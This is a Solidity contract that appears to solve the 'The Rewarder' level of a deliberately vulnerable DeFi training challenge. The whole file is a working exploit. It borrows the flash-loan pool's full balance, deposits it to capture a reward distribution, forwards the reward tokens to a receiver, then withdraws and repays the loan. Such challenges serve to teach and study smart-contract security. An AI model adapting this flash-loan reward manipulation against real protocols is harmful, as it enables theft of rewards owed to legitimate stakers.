pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import { RewardToken } from "./RewardToken.sol";

contract AttackerTheRewarder {
    FlashLoanerPool private flpool;
    TheRewarderPool private rpool;
    DamnValuableToken private token;
    RewardToken private rtoken;
    address private receiver;

    constructor (FlashLoanerPool flpool_, TheRewarderPool rpool_, DamnValuableToken token_, RewardToken rtoken_, address receiver_) {
        flpool = flpool_;
        rpool = rpool_;
        token = token_;
        rtoken = rtoken_;
        receiver = receiver_;
    }

    function attack() external {
        flpool.flashLoan(token.balanceOf(address(flpool)));
    }

    function receiveFlashLoan(uint256 amount) external payable {
        token.approve(address(rpool), amount);
        rpool.deposit(amount);
        rpool.distributeRewards();
        rtoken.transfer(receiver, rtoken.balanceOf(address(this)));
        rpool.withdraw(amount);
        token.transfer(address(flpool), amount);
    }
}